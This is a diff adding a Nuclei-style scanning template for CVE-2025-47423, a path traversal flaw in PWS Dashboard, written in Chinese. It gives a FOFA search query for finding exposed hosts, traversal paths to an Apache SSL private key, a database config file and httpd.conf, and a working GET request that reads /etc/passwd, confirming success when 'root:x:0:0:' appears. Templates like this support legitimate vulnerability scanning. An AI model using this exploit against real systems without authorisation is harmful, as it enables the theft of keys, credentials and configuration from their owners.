@@ -1,0 +1,33 @@
+id: pws-dashboard-lfi-linux
+
+info:
+  name: "PWS Dashboard Linux 系统路径遍历导致任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="PWS Dashboard"
+          该漏洞允许远程攻击者通过构造恶意路径请求实现任意文件读取，可能暴露系统关键配置信息。受影响路径包含：
+          ../../../apache/conf/ssl.key/server.key
+          ../../../config/database.php
+          ../../../../Program Files/Apache Group/Apache/conf/httpd.conf
+  reference:
+  - CVE-2025-47423
+  tags: PWS
+
+http:
+- raw:
+  - |
+    GET /others/_test.php?test=../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0:'
